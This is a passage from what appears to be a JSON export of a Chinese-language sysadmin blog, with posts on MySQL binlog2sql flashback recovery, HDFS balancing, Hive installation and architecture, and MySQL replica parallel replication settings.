14:45:00&#x27; --stop-datetime=&#x27;2019-04-04 14:50:00&#x27; &gt;/tmp/raw.sql 12345# cat &#x2F;tmp&#x2F;raw.sql DELETE FROM &#96;test&#96;.&#96;bigdata&#96; WHERE &#96;class_id&#96;&#x3D;19 AND &#96;class_name&#96;&#x3D;&#39;Other&#39; AND &#96;class_month&#96;&#x3D;1704 AND &#96;teacher&#96;&#x3D;&#39;GaryWu&#39; AND &#96;last_mod_ts&#96;&#x3D;&#39;2019-04-04 10:52:10&#39; LIMIT 1; #start 6438 end 6732 time 2019-04-04 14:47:43DELETE FROM &#96;test&#96;.&#96;bigdata&#96; WHERE &#96;class_id&#96;&#x3D;20 AND &#96;class_name&#96;&#x3D;&#39;Other&#39; AND &#96;class_month&#96;&#x3D;1705 AND &#96;teacher&#96;&#x3D;&#39;wuyanteng&#39; AND &#96;last_mod_ts&#96;&#x3D;&#39;2019-04-04 10:52:25&#39; LIMIT 1; #start 6438 end 6732 time 2019-04-04 14:47:43 根据位置信息，我们确定了误操作sql来自同一个事务，准确位置在6438-6732之间（binlog2sql对于同一个事务会输出同样的start position）。 使用 -B 选项生成回滚SQL，并检查回滚SQL是否正确 1# python binlog2sql/binlog2sql.py -h127.0.0.1 -uroot -p -P3306 -dtest -tbigdata --start-file=&#x27;mysql-bin.000002&#x27; --start-datetime=&#x27;2019-04-04 14:45:00&#x27; --stop-datetime=&#x27;2019-04-04 14:50:00&#x27; -B &gt;/tmp/rollback.sql 解析出的回滚SQL经常会需要进一步筛选并且需要与业务方确认SQL语句是否存在问题。 1234# cat &#x2F;tmp&#x2F;rollback.sqlINSERT INTO &#96;test&#96;.&#96;bigdata&#96;(&#96;class_id&#96;, &#96;class_name&#96;, &#96;class_month&#96;, &#96;teacher&#96;, &#96;last_mod_ts&#96;) VALUES (20, &#39;Other&#39;, 1705, &#39;wuyanteng&#39;, &#39;2019-04-04 10:52:25&#39;); #start 6438 end 6732 time 2019-04-04 14:47:43INSERT INTO &#96;test&#96;.&#96;bigdata&#96;(&#96;class_id&#96;, &#96;class_name&#96;, &#96;class_month&#96;, &#96;teacher&#96;, &#96;last_mod_ts&#96;) VALUES (19, &#39;Other&#39;, 1704, &#39;GaryWu&#39;, &#39;2019-04-04 10:52:10&#39;); #start 6438 end 6732 time 2019-04-04 14:47:43 如果一切准确无误，则执行回滚语句 123456789mysql -h127.0.0.1 -P3306 -uroot -p &lt; &#x2F;tmp&#x2F;rollback.sqlmysql&gt; select count(*) from bigdata;+----------+| count(*) |+----------+| 20 |+----------+1 row in set (0.00 sec) MySQL闪回思想 闪回的目标：快速筛选出真正需要回滚的数据。 先根据库、表、时间做一次过滤，再根据位置做更准确的过滤。 由于数据一直在写入，要确保回滚sql中不包含其他数据。可根据是否是同一事务、误操作行数、字段值的特征等等来帮助判断。 执行回滚sql时如有报错，需要查实具体原因，一般是因为对应的数据已发生变化。由于是严格的行模式，只要有唯一键(包括主键)存在，就只会报某条数据不存在的错，不必担心会更新不该操作的数据。业务如果有特殊逻辑，数据回滚可能会带来影响。 如果只回滚某张表，并且该表有关联表，关联表并不会被回滚，需与业务方沟通清楚。 总之，哪些数据需要回滚，让业务方来判断！","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"binlog","slug":"binlog","permalink":"https://garywu520.github.io/tags/binlog/"},{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"},{"name":"binlog2sql","slug":"binlog2sql","permalink":"https://garywu520.github.io/tags/binlog2sql/"},{"name":"row","slug":"row","permalink":"https://garywu520.github.io/tags/row/"},{"name":"数据闪回","slug":"数据闪回","permalink":"https://garywu520.github.io/tags/%E6%95%B0%E6%8D%AE%E9%97%AA%E5%9B%9E/"}]},{"title":"binlog分析工具之binlog2sql","slug":"binlog分析工具之binlog2sql","date":"2019-04-02T02:36:22.000Z","updated":"2019-04-02T03:02:36.679Z","comments":true,"path":"2019/04/02/binlog分析工具之binlog2sql/","link":"","permalink":"https://garywu520.github.io/2019/04/02/binlog%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E4%B9%8Bbinlog2sql/","excerpt":"GitHub项目地址：binlog2sql 适用场景 从binlog生成标准SQL, 用于分析 数据快速回滚 已测试的环境 Python 2.7 或 3.4+ MySQL 5.6 或 5.7 安装python3安装参考–自带pip：编译安装Python3及扩展 git安装：略 12shell&gt; git clone https://github.com/danfengcao/binlog2sql.git &amp;&amp; cd binlog2sqlshell&gt; pip install -r requirements.txt","text":"GitHub项目地址：binlog2sql 适用场景 从binlog生成标准SQL, 用于分析 数据快速回滚 已测试的环境 Python 2.7 或 3.4+ MySQL 5.6 或 5.7 安装python3安装参考–自带pip：编译安装Python3及扩展 git安装：略 12shell&gt; git clone https://github.com/danfengcao/binlog2sql.git &amp;&amp; cd binlog2sqlshell&gt; pip install -r requirements.txt MySQL使用要求123456[mysqld]server_id &#x3D; 1 #需配置server_id参数log_bin &#x3D; &#x2F;var&#x2F;log&#x2F;mysql&#x2F;mysql-bin.logmax_binlog_size &#x3D; 1Gbinlog_format &#x3D; rowbinlog_row_image &#x3D; full #默认为FULL 用户权限要求12建议授权GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO 基本用法: 解析出标准SQL12格式：shell&gt; python binlog2sql.py -h127.0.0.1 -P3306 -uadmin -p&#x27;admin&#x27; -dtestdb -t test3 test4 --start-file=&#x27;mysql-bin.000002&#x27; &gt;&gt;/data/testdb_binlog2sql.sql 选项– mysql连接配置 1-h host; -P port; -u user; -p password – 解析模式 1234567--stop-never 持续解析binlog。可选。默认False，同步至执行命令时最新的binlog位置。-K, --no-primary-key 对INSERT语句去除主键。可选。默认False-B, --flashback 生成回滚SQL，可解析大文件，不受内存限制。可选。默认False。与stop-never或no-primary-key不能同时添加。--back-interval -B模式下，每打印一千行回滚SQL，加一句SLEEP多少秒，如不想加SLEEP，请设为0。可选。默认1.0。 – 解析范围控制 1234567891011--start-file 起始解析文件，只需文件名，无需全路径 。必须。--start-position&#x2F;--start-pos 起始解析位置。可选。默认为start-file的起始位置。--stop-file&#x2F;--end-file 终止解析文件。可选。默认为start-file同一个文件。若解析模式为stop-never，此选项失效。--stop-position&#x2F;--end-pos 终止解析位置。可选。默认为stop-file的最末位置；若解析模式为stop-never，此选项失效。--start-datetime 起始解析时间，格式&#39;%Y-%m-%d %H:%M:%S&#39;。可选。默认不过滤。--stop-datetime 终止解析时间，格式&#39;%Y-%m-%d %H:%M:%S&#39;。可选。默认不过滤。 – 对象过滤 1234567d, --databases 只解析目标db的sql，多个库用空格隔开，如-d db1 db2。可选。默认为空。-t, --tables 只解析目标table的sql，多张表用空格隔开，如-t tbl1 tbl2。可选。默认为空。--only-dml 只解析dml，忽略ddl。可选。默认False。--sql-type 只解析指定类型，支持INSERT, UPDATE, DELETE。多个类型用空格隔开，如--sql-type INSERT DELETE。可选。默认为增删改都解析。用了此参数但没填任何类型，则三者都不解析。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"binlog","slug":"binlog","permalink":"https://garywu520.github.io/tags/binlog/"},{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"},{"name":"binlog2sql","slug":"binlog2sql","permalink":"https://garywu520.github.io/tags/binlog2sql/"},{"name":"python","slug":"python","permalink":"https://garywu520.github.io/tags/python/"}]},{"title":"HDFS的Block数据balancer重新分布","slug":"HDFS的Block数据balancer重新分布","date":"2019-04-01T02:58:45.000Z","updated":"2019-04-01T03:13:50.104Z","comments":true,"path":"2019/04/01/HDFS的Block数据balancer重新分布/","link":"","permalink":"https://garywu520.github.io/2019/04/01/HDFS%E7%9A%84Block%E6%95%B0%E6%8D%AEbalancer%E9%87%8D%E6%96%B0%E5%88%86%E5%B8%83/","excerpt":"HDFS balancer重新平衡，即实现HDFS Block数据物理存储重新分布，可以有效解决物理磁盘空间占用高的问题。 在CDH HDFS集群中，务必至少有1个节点为balancer节点，否则CM平台将无“重新平衡”选项。如果集群中无balancer节点，则需要新增balancer角色。另外，balancer节点应运行在非namenode节点上 CM平台的“重新平衡” 实际上调用的是hadoop重平衡命令，即：hadoop balancer -threshold 5 参数注释：其中-threshold参数是用来判断数据平衡的依据，值范围为0-100。默认值为10，表示HDFS达到平衡状态的磁盘使用率偏差值为10%，如果机器与机器之间磁盘使用率偏差小于10%，那么我们就认为HDFS集群已经达到了平衡的状态。 注：Balancer阈值越高，需要平衡的量越少，DN占用率不够均衡；阈值越低，需要平衡的量越大， DN占有率越均衡；","text":"HDFS balancer重新平衡，即实现HDFS Block数据物理存储重新分布，可以有效解决物理磁盘空间占用高的问题。 在CDH HDFS集群中，务必至少有1个节点为balancer节点，否则CM平台将无“重新平衡”选项。如果集群中无balancer节点，则需要新增balancer角色。另外，balancer节点应运行在非namenode节点上 CM平台的“重新平衡” 实际上调用的是hadoop重平衡命令，即：hadoop balancer -threshold 5 参数注释：其中-threshold参数是用来判断数据平衡的依据，值范围为0-100。默认值为10，表示HDFS达到平衡状态的磁盘使用率偏差值为10%，如果机器与机器之间磁盘使用率偏差小于10%，那么我们就认为HDFS集群已经达到了平衡的状态。 注：Balancer阈值越高，需要平衡的量越少，DN占用率不够均衡；阈值越低，需要平衡的量越大， DN占有率越均衡； CM平台中重新平衡阈值设定 判断集群是否平衡的目标参数，每一个 Datanode 存储使用率和集群总存储使用率的差值都应该小于这个阀值，理论上，该参数设置的越小，整个集群就越平衡，但是在线上环境中，Hadoop集群在进行balance时，还在并发的进行数据的写入和删除，所以有可能无法到达设定的平衡参数值。 balancer命令帮助查看帮助：hadoop balancer -help 123456789101112131415161718192021[root@hadoop ~]# hadoop balancer -helpDEPRECATED: Use of this script to execute hdfs command is deprecated.Instead use the hdfs command for it.Usage: java Balancer[-policy &lt;policy&gt;] the balancing policy: datanode or blockpool[-threshold &lt;threshold&gt;] Percentage of disk capacity[-exclude [-f &lt;hosts-file&gt; | comma-sperated list of hosts]] Excludes the specified datanodes.[-include [-f &lt;hosts-file&gt; | comma-sperated list of hosts]] Includes only the specified datanodes.Generic options supported are-conf &lt;configuration file&gt; specify an application configuration file-D &lt;property=value&gt; use value for given property-fs &lt;local|namenode:port&gt; specify a namenode-jt &lt;local|resourcemanager:port&gt; specify a ResourceManager-files &lt;comma separated list of files&gt; specify comma separated files to be copied to the map reduce cluster-libjars &lt;comma separated list of jars&gt; specify comma separated jar files to include in the classpath.-archives &lt;comma separated list of archives&gt; specify comma separated archives to be unarchived on the compute machines.The general command line syntax isbin/hadoop command [genericOptions] [commandOptions]","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"CDH","slug":"CDH","permalink":"https://garywu520.github.io/tags/CDH/"},{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"hadoop","slug":"hadoop","permalink":"https://garywu520.github.io/tags/hadoop/"},{"name":"HDFS","slug":"HDFS","permalink":"https://garywu520.github.io/tags/HDFS/"},{"name":"CM","slug":"CM","permalink":"https://garywu520.github.io/tags/CM/"},{"name":"balancer","slug":"balancer","permalink":"https://garywu520.github.io/tags/balancer/"},{"name":"重新平衡","slug":"重新平衡","permalink":"https://garywu520.github.io/tags/%E9%87%8D%E6%96%B0%E5%B9%B3%E8%A1%A1/"},{"name":"重新分布","slug":"重新分布","permalink":"https://garywu520.github.io/tags/%E9%87%8D%E6%96%B0%E5%88%86%E5%B8%83/"}]},{"title":"Mars-Hadoop Hive环境搭建","slug":"Mars-Hadoop-Hive环境搭建","date":"2019-03-27T06:07:43.000Z","updated":"2019-03-27T10:44:49.659Z","comments":true,"path":"2019/03/27/Mars-Hadoop-Hive环境搭建/","link":"","permalink":"https://garywu520.github.io/2019/03/27/Mars-Hadoop-Hive%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"Hive连接模式 单用户模式(元数据默认使用Derby关系型数据库存储) 多用户模式 远程模式 环境准备 Hadoop V2.7.2 要保证Hadoop服务已经启动。Hadoop环境搭建: 参考 MySQL主从 本次MySQL数据库部署在Slave1【IP:10.0.10.111】服务器上。 Hive 安装在Slave3【IP：10.0.10.113】上","text":"Hive连接模式 单用户模式(元数据默认使用Derby关系型数据库存储) 多用户模式 远程模式 环境准备 Hadoop V2.7.2 要保证Hadoop服务已经启动。Hadoop环境搭建: 参考 MySQL主从 本次MySQL数据库部署在Slave1【IP:10.0.10.111】服务器上。 Hive 安装在Slave3【IP：10.0.10.113】上 下载Hive官方网站：http://hive.apache.org/downloads.html 下载带有*-bin的hive压缩包: apache-hive-2.3.4-bin.tar.gz 配置环境变量123tar -zxf apache-hive-2.3.4-bin.tar.gzmv apache-hive-2.3.4-bin /opt/ln -sv /opt/apache-hive-2.3.4-bin /opt/hive 12345cat /etc/profile#Hiveexport HIVE_HOME=/opt/hiveexport PATH=$PATH:$HIVE_HOME/bin 配置Hive(1) hive-env.sh 123456cp /opt/hive/conf/hive-env.sh.template /opt/hive/conf/hive-env.sh echo $HADOOP_HOME/opt/hadoop修改/opt/hive/conf/hive-env.sh文件的HADOOP_HOME变量为：HADOOP_HOME=/opt/hadoop (2)hive-site.xml 1cp /opt/hive/conf/hive-default.xml.template /opt/hive/conf/hive-site.xml 单用户模式【一般只用于测试环境】即, 元数据使用内嵌Derby数据库做存储 多用户模式-配置即元数据非Derby, 而使用其他的关系型数据库存储(例如：MySQL、Oracle等) Hive的元数据：表信息，表属性，分区，列等等信息，Owner Hive的实际数据：在HDFS上 创建数据库并授权 slave1节点的mysql数据库下面需要提前创建一个名为hive的数据库, 账号密码均为hive 1234[root@slave1 ~]# mysql -uroot -pmysql&gt; create database hive;mysql&gt; GRANT ALL PRIVILEGES ON hive.* TO &#39;hive&#39;@&#39;%&#39; IDENTIFIED BY &#39;hive&#39; WITH GRANT OPTION;mysql&gt; flush privileges; Hive-site.xml的配置 12345678910111213141516171819202122&lt;configuration&gt; &lt;property&gt; &lt;description&gt;指定Hive连接数据库的连接字符串&lt;/description&gt; &lt;name&gt; javax.jdo.option.ConnectionURL&lt;/name&gt; &lt;value&gt;jdbc:mysql://slave1:3306/hive?createDatabaseIfNotExist=true&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;description&gt;指定以MySQL作为驱动类入口&lt;/description&gt; &lt;name&gt;javax.jdo.option.ConnectionDriver&lt;/name&gt; &lt;value&gt;com.mysql.jdbc.Driver&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;description&gt;指定数据库用户名&lt;/description&gt; &lt;name&gt;javax.jdo.option.ConnectionUserName&lt;/name&gt; &lt;value&gt;hive&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;description&gt;指定数据库密码&lt;/description&gt; &lt;name&gt;javax.jdo.option.ConnectionPassword&lt;/name&gt; &lt;value&gt;hive&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 配置MySQL驱动 驱动下载：mysql-connector-java-5.1.47.zip 123[root@slave3]# unzip mysql-connector-java-5.1.47.zip[root@slave3]# cp mysql-connector-java-5.1.47/mysql-connector-java-5.1.47-bin.jar $HIVE_HOME/lib/[root@slave3]# ls -lh $HIVE_HOME/lib/mysql-connector-java-5.1.47-bin.jar 初始化元数据库 1234567891011121314[root@slave3 conf]# schematool -initSchema --dbType mysqlSLF4J: Class path contains multiple SLF4J bindings.SLF4J: Found binding in [jar:file:/opt/apache-hive-2.3.4-bin/lib/log4j-slf4j-impl-2.6.2.jar!/org/slf4j/impl/StaticLoggerBinder.class]SLF4J: Found binding in [jar:file:/opt/hadoop-2.7.3/share/hadoop/common/lib/slf4j-log4j12-1.7.10.jar!/org/slf4j/impl/StaticLoggerBinder.class]SLF4J: See http://www.slf4j.org/codes.html#multiple_bindings for an explanation.SLF4J: Actual binding is of type [org.apache.logging.slf4j.Log4jLoggerFactory]Metastore connection URL: jdbc:mysql://slave1:3306/hive?createDatabaseIfNotExist=trueMetastore Connection Driver : org.apache.derby.jdbc.EmbeddedDriverMetastore connection User: hiveStarting metastore schema initialization to 2.3.0Initialization script hive-schema-2.3.0.mysql.sqlInitialization script completedschemaTool completed 配置远程模式- 即启动Metastore server服务【生产环境需要配置自启动】123456[root@slave3 conf]# hive --service metastore &amp; Metastore Server默认端口号：9083# ss -lntup|grep 9083tcp LISTEN 0 50 *:9083 *:* users:((&quot;java&quot;,pid=20847,fd=452)) centos7自启 1234567891011# cat /etc/systemd/system/hive_metastore_server.service[Unit]Description=Start or stop hive metastore serverAfter=network.targetWants=network.target[Service]ExecStart=/opt/hive/bin/hive --service metastore[Install]WantedBy=multi-user.target 123systemctl enable hive_metastore_serversystemctl start hive_metastore_serversystemctl status hive_metastore_server 测试Hive 12345678910#查询数据库hive&gt; show databases;OKdefaultTime taken: 4.555 seconds, Fetched: 1 row(s)#创建数据库hive&gt; create database garywu;OKTime taken: 0.335 seconds 123456789101112131415161718192021222324252627282930313233343536#创建表hive&gt; use garywu;OKTime taken: 0.051 secondshive&gt; create table hive_test (mykey string,myval string);OKTime taken: 1.374 seconds#插入数据hive&gt; insert into hive_test values(&quot;1&quot;,&quot;https:&#x2F;&#x2F;www.garywu.io&quot;);Query ID &#x3D; root_20190327181939_360a8a91-7c80-4034-86fb-8394ef233494Total jobs &#x3D; 3Launching Job 1 out of 3............Stage-Stage-1: Map: 1 Cumulative CPU: 2.11 sec HDFS Read: 4060 HDFS Write: 311254 SUCCESSTotal MapReduce CPU Time Spent: 2 seconds 110 msecOKTime taken: 30.931 seconds#select查询hive&gt; select * from hive_test;OK1 https:&#x2F;&#x2F;www.garywu.ioTime taken: 0.411 seconds, Fetched: 1 row(s)#删除一个表hive&gt; drop table garywu;Moved: &#39;hdfs:&#x2F;&#x2F;nn&#x2F;user&#x2F;hive&#x2F;warehouse&#x2F;garywu.db&#x2F;garywu&#39; to trash at: hdfs:&#x2F;&#x2F;nn&#x2F;user&#x2F;root&#x2F;.Trash&#x2F;CurrentOKTime taken: 1.929 seconds#注：这里可以看到删除操作直接将数据移动到了HDFS的垃圾桶#退出hivehive&gt; exit; HDFS上查看刚刚写入的hdfs数据 注：默认hive创建的数据会在HDFS的/user/hive/warehouse目录，除非修改了配置","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"Hive","slug":"Hive","permalink":"https://garywu520.github.io/tags/Hive/"},{"name":"Hadoop","slug":"Hadoop","permalink":"https://garywu520.github.io/tags/Hadoop/"},{"name":"spark","slug":"spark","permalink":"https://garywu520.github.io/tags/spark/"},{"name":"tez","slug":"tez","permalink":"https://garywu520.github.io/tags/tez/"},{"name":"单用户模式","slug":"单用户模式","permalink":"https://garywu520.github.io/tags/%E5%8D%95%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F/"},{"name":"多用户模式","slug":"多用户模式","permalink":"https://garywu520.github.io/tags/%E5%A4%9A%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F/"},{"name":"远程模式","slug":"远程模式","permalink":"https://garywu520.github.io/tags/%E8%BF%9C%E7%A8%8B%E6%A8%A1%E5%BC%8F/"}]},{"title":"Mars-hadoop hive架构介绍","slug":"Mars-hadoop-hive架构介绍","date":"2019-03-27T04:04:32.000Z","updated":"2019-03-27T04:34:27.656Z","comments":true,"path":"2019/03/27/Mars-hadoop-hive架构介绍/","link":"","permalink":"https://garywu520.github.io/2019/03/27/Mars-hadoop-hive%E6%9E%B6%E6%9E%84%E4%BB%8B%E7%BB%8D/","excerpt":"Hive介绍Hive是建立在 Hadoop上的数据仓库基础构架，它提供了一系列的工具，可以通过SQL轻松的访问数据，可以完成数据仓库任务、报表及数据分析。可以用来进行数据提取转化加载（ETL），这是一种可以存储、查询和分析存储在 Hadoop 中的大规模数据的机制。 Hive 定义了简单的类 SQL 查询语言，称为 HQL，它允许熟悉 SQL 的用户查询数据。同时，这个语言也允许熟悉 MapReduce 开发者的开发自定义的 mapper 和 reducer 来处理内建的 mapper 和 reducer 无法完成的复杂的分析工作。","text":"Hive介绍Hive是建立在 Hadoop上的数据仓库基础构架，它提供了一系列的工具，可以通过SQL轻松的访问数据，可以完成数据仓库任务、报表及数据分析。可以用来进行数据提取转化加载（ETL），这是一种可以存储、查询和分析存储在 Hadoop 中的大规模数据的机制。 Hive 定义了简单的类 SQL 查询语言，称为 HQL，它允许熟悉 SQL 的用户查询数据。同时，这个语言也允许熟悉 MapReduce 开发者的开发自定义的 mapper 和 reducer 来处理内建的 mapper 和 reducer 无法完成的复杂的分析工作。 应用场景Hive 构建在基于静态批处理的Hadoop 之上，Hadoop 通常都有较高的延迟并且在作业提交和调度的时候需要大量的开销。因此，Hive 并不能够在大规模数据集上实现低延迟快速的查询，例如，Hive 在几百MB 的数据集上执行查询一般有分钟级的时间延迟。因此， Hive 并不适合那些需要低延迟的应用，例如，联机事务处理（OLTP）。Hive 查询操作过程严格遵守Hadoop MapReduce 的作业执行模型，Hive 将用户的HiveQL 语句通过解释器转换为MapReduce 作业提交到Hadoop 集群上，Hadoop 监控作业执行过程，然后返回作业执行结果给用户。Hive 并非为联机事务处理而设计，Hive 并不提供实时的查询和基于行级的数据更新操作。Hive 的最佳使用场合是大数据集的批处理作业，例如，网络日志分析。 Hive设计特征Hive 是一种底层封装了Hadoop 的数据仓库处理工具，使用类SQL 的HiveQL 语言实现数据查询，所有Hive 的数据都存储在Hadoop 兼容的文件系统（例如，Amazon S3、HDFS）中。Hive 在加载数据过程中不会对数据进行任何的修改，只是将数据移动到HDFS 中Hive 设定的目录下，因此，Hive 不支持对数据的改写和添加，所有的数据都是在加载的时候确定的。 Hive 的设计特点如下: ● 支持索引，加快数据查询。 ● 支持不同的存储类型，例如，HDFS或其他的数据存储系统(如Hbase) ● 将元数据保存在关系数据库中，大大减少了在查询过程中执行语义检查的时间。 ● 可以直接使用存储在Hadoop 文件系统中的数据。 ● 支持LLAP(Live Long And Process), 使Hive实现内存计算 ● 类SQL 的查询方式，将SQL 查询转换为MapReduce 的job 在Hadoop集群上执行。 Hive体系结构用户接口用户接口主要有三个：CLI，Client 和 Web UI。 其中最常用的是 CLI，CLI启动的时候，会同时启动一个 Hive 副本。 Client 是 Hive 的客户端，用户连接至 Hive Server。在启动 Client 模式的时候，需要指出 Hive Server 所在节点，并且在该节点启动 Hive Server。 WUI 是通过浏览器访问 Hive。 元数据存储Hive将元数据存储在数据库中，如 mysql、derby。Hive 中的元数据包括表的名字，表的列和分区及其属性，表的属性（是否为外部表等），表的数据所在目录等。 解释器、编译器、优化器、执行器解释器、编译器、优化器完成 HQL 查询语句从词法分析、语法分析、编译、优化以及查询计划的生成。生成的查询计划存储在 HDFS 中，并在随后由 MapReduce 调用执行。 Hive架构Hive 将Hive Metastore元数据(包括表分区、表属性、格式等等)信息存储在了关系型数据库中，比如MySQL。 Driver包括解释器、编译器、优化器、执行器, 最终将HQL的查询语句转换成查询计划，而这个查询计划会存储在HDFS当中，最后交给MapReduce(作为作业)调用执行 注：包含 * 的查询，比如 select * from tbl 不会生成 MapReduce 任务 Hive原数据连接模式 单用户模式 一个用户只能运行一个会话去访问hive 多用户模式 多个用户可同时多个会话访问hive 远程模式 数据存储首先，Hive 没有专门的数据存储格式，也没有为数据建立索引，用户可以非常自由的组织 Hive 中的表，只需要在创建表的时候告诉 Hive 数据中的列分隔符和行分隔符，Hive 就可以解析数据。比如：.csv文件等。其次，Hive 中所有的数据都存储在 HDFS 中，Hive 中包含以下数据模型：表(Table)，外部表(External Table)，分区(Partition)，桶(Bucket)。 Hive 中的 Table 和数据库中的 Table 在概念上是类似的，每一个 Table 在 Hive 中都有一个相应的目录存储数据。例如，一个表 pvs，它在 HDFS 中的路径为：/wh/pvs，其中，wh 是在 hive-site.xml 中由 ${hive.metastore.warehouse.dir} 指定的数据仓库的目录，所有的 Table 数据（不包括 External Table）都保存在这个目录中。 Partition 1Partition 对应于数据库中的 Partition 列的密集索引，但是 Hive 中 Partition 的组织方式和数据库中的很不相同。在 Hive 中，表中的一个 Partition 对应于表下的一个目录，所有的 Partition 的数据都存储在对应的目录中。例如：pvs 表中包含 ds 和 city 两个 Partition，则对应于 ds &#x3D; 20090801, ctry &#x3D; US 的 HDFS 子目录为：&#x2F;wh&#x2F;pvs&#x2F;ds&#x3D;20090801&#x2F;ctry&#x3D;US；对应于 ds &#x3D; 20090801, ctry &#x3D; CA 的 HDFS 子目录为；&#x2F;wh&#x2F;pvs&#x2F;ds&#x3D;20090801&#x2F;ctry&#x3D;CA Buckets 1Buckets 对指定列计算 hash，根据 hash 值切分数据，目的是为了并行，每一个 Bucket 对应一个文件。将 user 列分散至 32 个 bucket，首先对 user 列的值计算 hash，对应 hash 值为 0 的 HDFS 目录为：&#x2F;wh&#x2F;pvs&#x2F;ds&#x3D;20090801&#x2F;ctry&#x3D;US&#x2F;part-00000；hash 值为 20 的 HDFS 目录为：&#x2F;wh&#x2F;pvs&#x2F;ds&#x3D;20090801&#x2F;ctry&#x3D;US&#x2F;part-00020 Table 123External Table 指向已经在 HDFS 中存在的数据，可以创建 Partition。它和 Table 在元数据的组织上是相同的，而实际数据的存储则有较大的差异。Table 的创建过程和数据加载过程（这两个过程可以在同一个语句中完成），在加载数据的过程中，实际数据会被移动到数据仓库目录中；之后对数据对访问将会直接在数据仓库目录中完成。删除表时，表中的数据和元数据将会被同时删除。 External Table 1External Table 只有一个过程，加载数据和创建表同时完成（CREATE EXTERNAL TABLE ……LOCATION），实际数据是存储在 LOCATION 后面指定的 HDFS 路径中，并不会移动到数据仓库目录中。当删除一个 External Table 时，仅删除元数据，表中的数据不会真正被删除。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"hadoop","slug":"hadoop","permalink":"https://garywu520.github.io/tags/hadoop/"},{"name":"hdfs","slug":"hdfs","permalink":"https://garywu520.github.io/tags/hdfs/"},{"name":"hive","slug":"hive","permalink":"https://garywu520.github.io/tags/hive/"},{"name":"HQL","slug":"HQL","permalink":"https://garywu520.github.io/tags/HQL/"}]},{"title":"mysql从库降低延迟","slug":"mysql从库降低延迟","date":"2019-03-26T03:23:00.000Z","updated":"2019-03-28T10:07:18.058Z","comments":true,"path":"2019/03/26/mysql从库降低延迟/","link":"","permalink":"https://garywu520.github.io/2019/03/26/mysql%E4%BB%8E%E5%BA%93%E9%99%8D%E4%BD%8E%E5%BB%B6%E8%BF%9F/","excerpt":"slave复制延迟较大优化默认mysql从库SQL为单线程，所以从库同步执行速度相对较慢，进而导致延迟增大。在MySQL5.7版本可以通过设置逻辑时钟来实现从库多线程复制 查看从库复制线程状态主从环境部署完毕后，查看从库当前的线程状态 123456789mysql&gt; show processlist;+--------+-------------+-----------+------+---------+-------+------------------------------| Id | User | | db | Command | Time | State +--------+-------------+-----------+------+---------+-------+------------------------------| 148594 | system user | NULL | Connect | 22286 | Waiting for master to send event | 148595 | system user | NULL | Connect | 2672 | Slave has read all relay log; waiting for| 150081 | root | NULL | Query | 0 | starting +--------+-------------+-----------+------+---------+-------+------------------------------3 rows in set (0.00 sec) 可以看到当前只有一个复制线程","text":"slave复制延迟较大优化默认mysql从库SQL为单线程，所以从库同步执行速度相对较慢，进而导致延迟增大。在MySQL5.7版本可以通过设置逻辑时钟来实现从库多线程复制 查看从库复制线程状态主从环境部署完毕后，查看从库当前的线程状态 123456789mysql&gt; show processlist;+--------+-------------+-----------+------+---------+-------+------------------------------| Id | User | | db | Command | Time | State +--------+-------------+-----------+------+---------+-------+------------------------------| 148594 | system user | NULL | Connect | 22286 | Waiting for master to send event | 148595 | system user | NULL | Connect | 2672 | Slave has read all relay log; waiting for| 150081 | root | NULL | Query | 0 | starting +--------+-------------+-----------+------+---------+-------+------------------------------3 rows in set (0.00 sec) 可以看到当前只有一个复制线程 配置从库多线程复制1. 在从库上停止复制1mysql&gt; stop slave; 2. 设置并发同步类型为逻辑时钟方式先看下现在 slave 的并发类型 1234567mysql&gt; show variables like &#x27;slave_parallel_type&#x27;;+---------------------+----------+| Variable_name | Value |+---------------------+----------+| slave_parallel_type | DATABASE |+---------------------+----------+1 row in set (0.18 sec) 默认是database，每个线程只能处理一个数据库 配置成基于逻辑时钟的方式 123mysql&gt; set global slave_parallel_type=&#x27;logical_clock&#x27;;mysql&gt; show variables like &#x27;slave_parallel_type&#x27;; 3. 设置复制线程的数量先看下当前的并发量 1234567mysql&gt; show variables like &#39;slave_parallel_workers&#39;;+------------------------+-------+| Variable_name | Value |+------------------------+-------+| slave_parallel_workers | 0 |+------------------------+-------+1 row in set (0.00 sec) 修改并发量为8 123mysql&gt; set global slave_parallel_workers&#x3D;8;mysql&gt; show variables like &#39;slave_parallel_workers&#39;; 4. 启动从库复制1mysql&gt; start slave; 验证配置结果 1mysql&gt; show processlist; 多线程复制好处多源线程，即每个sql线程处理不同的database，提高了并发性能，即使某database的某条语句暂时卡住，也不会影响到后续对其它的database进行操作。多线程复制在一定程度上解决了从库延迟主库并且很难追上的问题。 